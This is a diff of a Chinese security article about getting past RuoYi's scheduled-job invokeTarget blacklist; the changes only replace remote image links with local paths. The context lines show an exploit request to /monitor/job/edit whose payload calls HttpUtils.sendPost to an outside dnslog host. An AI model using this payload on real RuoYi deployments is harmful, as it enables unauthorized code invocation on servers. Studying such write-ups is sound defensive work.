@@ -81,7 +81,7 @@ https://gitee.com/y_project/RuoYi/blob/master/ruoyi-common/src/main/java/com/ruo
   
 这是若依黑名单位置：ruoyi-common/src/main/java/com/ruoyi/common/constant/Constants.java。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMsZEcQz3fKRKuTYRsgeqJnBXHeTX8AD09L2yOy5UWagfnoiau7ic4TphsYLkXXJNv1r5uqkz6dDVA1Q/640?wx_fmt=png&from=appmsg&random=0.6949478832681126&random=0.26939201221393394 "")  
+![](../../.resource/remote/08864ade80ef44b267845e1eb09fc0deb25846571a00d10e0b4ddcb95d6c513d.png "")  
   
 没加com.ruoyi.common的黑名单限制。  
   
@@ -99,7 +99,7 @@ https://gitee.com/y_project/RuoYi/blob/master/ruoyi-common/src/main/java/com/ruo
 com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp://6a928e83f9.ipv6.1433.eu.org','')
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMsZEcQz3fKRKuTYRsgeqJnB0lRsgvbibcymtlu53DFrrcJdXSFN6jcwhWINsyRp0XKXdfPD7K6W1pQ/640?wx_fmt=png&from=appmsg&random=0.9732152413003161 "")  
+![](../../.resource/remote/d9d18ea458719b47e410bf424be30a0f49540bf5111c60f5e314a7ef6ebdb574.png "")  
 ```
 POST /monitor/job/edit HTTP/1.1
 Host: xxx
@@ -136,12 +136,12 @@ createBy=admin&jobName=test1&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.util
   
 点完之后去dnslog那里看就行了，这里执行需要等待5-20秒。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMsZEcQz3fKRKuTYRsgeqJnBH6uClxpKYnlLJ7J9RCDSNyImAYdIYicJHF4G9Akiawrx0ngcfgmZiacPA/640?wx_fmt=png&from=appmsg&random=0.6412688614656281 "")  
+![](../../.resource/remote/69c287176b18ba203068598bb784f2d907852a7a914e4b0984c0cd39a0f9996b.png "")  
   
   
 后面执行完毕之后在调度日志也可以看到。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMsZEcQz3fKRKuTYRsgeqJnBHESLBYSHFeBuoT5WWk5U2HVqKKGjnV3VsIge4SzG3micWrV8zVIUUag/640?wx_fmt=png&from=appmsg&random=0.3613715179024466 "")  
+![](../../.resource/remote/ba7e9167e195932e3306ac522cd37812df9e33d600442542b5c8d1ec33bd8d28.png "")  
   
    
   
@@ -150,7 +150,7 @@ createBy=admin&jobName=test1&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.util
 技术交流  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hFPkDXcMlMsZEcQz3fKRKuTYRsgeqJnBZdaFQ2aslZz9AHFsdSJ3uMyZrROPicMvibICgKDZwHJwO3ATiaa0te3kQ/640?wx_fmt=jpeg "")  
+![](../../.resource/remote/aff8d089388d369ac68fe1fe5fb740c1572f8f149e7d61411ce9c67ea54ee0de.jpg "")  
   
   
   
